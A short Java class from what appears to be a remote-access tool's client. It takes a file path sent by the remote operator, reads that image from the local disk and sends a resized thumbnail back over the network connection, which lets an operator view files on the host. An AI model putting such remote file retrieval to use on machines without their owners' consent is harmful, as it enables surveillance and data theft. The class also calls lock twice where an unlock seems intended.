package com.redpois0n.packets;

import java.awt.image.BufferedImage;
import java.io.File;

import javax.imageio.ImageIO;

import com.redpois0n.Connection;
import com.redpois0n.ImageUtils;
import com.redpois0n.RemoteScreen;

public class PacketLISTI extends Packet {

	@Override
	public void read(String line) throws Exception {
		Connection.lock();
		
		String file = Connection.readLine();

		Connection.writeLine("IMGLIST");
		Connection.writeLine(file);

		BufferedImage screenShot = ImageIO.read(new File(file));
		screenShot = RemoteScreen.resize(screenShot, 150, 100);
		byte[] buffer = ImageUtils.encodeImage(screenShot, 1F);
		Connection.dos.writeInt(buffer.length);
		Connection.dos.write(buffer);

		Connection.lock();
	}

}
